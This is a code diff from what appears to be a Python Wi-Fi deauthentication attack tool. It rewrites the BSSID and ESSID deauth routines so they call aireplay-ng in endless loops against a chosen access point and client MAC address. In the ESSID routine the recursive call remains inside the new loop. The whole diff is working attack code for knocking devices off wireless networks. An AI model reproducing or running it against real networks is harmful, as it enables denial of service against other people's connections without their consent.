@@ -99,30 +99,30 @@ class Functs:
     class BSSID_METHOD:
         def deauth(bssid: BSSID):
             """"""
-
-            for key, value in bssid.bssids.items():
-                Functs.ChannelSys.hopper(value)
-                try:
-                    out = check_call(["aireplay-ng", "-0", "5", "-a", key, "-c", get_var('target_mac'), get_var('interface')], stdout=DEVNULL, stderr=STDOUT)
-                    Functs.BSSID_METHOD.deauth(BSSID(bssid.bssids))
-                except KeyboardInterrupt:
-                    Functs.switch(Interface(get_var('interface')), "managed")
-                    return
+            while True:
+                for key, value in bssid.bssids.items():
+                    Functs.ChannelSys.hopper(value)
+                    try:
+                        out = check_call(["aireplay-ng", "-0", "5", "-a", key, "-c", get_var('target_mac'), get_var('interface')], stdout=DEVNULL, stderr=STDOUT)
+                    except KeyboardInterrupt:
+                        Functs.switch(Interface(get_var('interface')), "managed")
+                        return
 
     class ESSID_METHOD:
         def deauth(eSSID: ESSID):
             """"""
             from deauthy.functs import get_var
-            current_wiface  = get_var('interface')
-            target_mac      = get_var('target_mac')
-            channel = eSSID.channel
-            Functs.ChannelSys.hopper(channel)
-            try:
-                out = check_call(["aireplay-ng", "-0", "5", "-e", eSSID.value, "-c", target_mac, current_wiface], stdout=DEVNULL, stderr=STDOUT)
-                Functs.ESSID_METHOD.deauth(ESSID(eSSID.value, channel))
-            except KeyboardInterrupt:
-                Functs.switch(Interface(current_wiface), "managed")
-                return
+            while True:
+                current_wiface  = get_var('interface')
+                target_mac      = get_var('target_mac')
+                channel = eSSID.channel
+                Functs.ChannelSys.hopper(channel)
+                try:
+                    out = check_call(["aireplay-ng", "-0", "5", "-e", eSSID.value, "-c", target_mac, current_wiface], stdout=DEVNULL, stderr=STDOUT)
+                    Functs.ESSID_METHOD.deauth(ESSID(eSSID.value, channel))
+                except KeyboardInterrupt:
+                    Functs.switch(Interface(current_wiface), "managed")
+                    return
 
 def mod_config(key: str, value):
     with open("deauthy/conf.json", "r") as jsonfile:
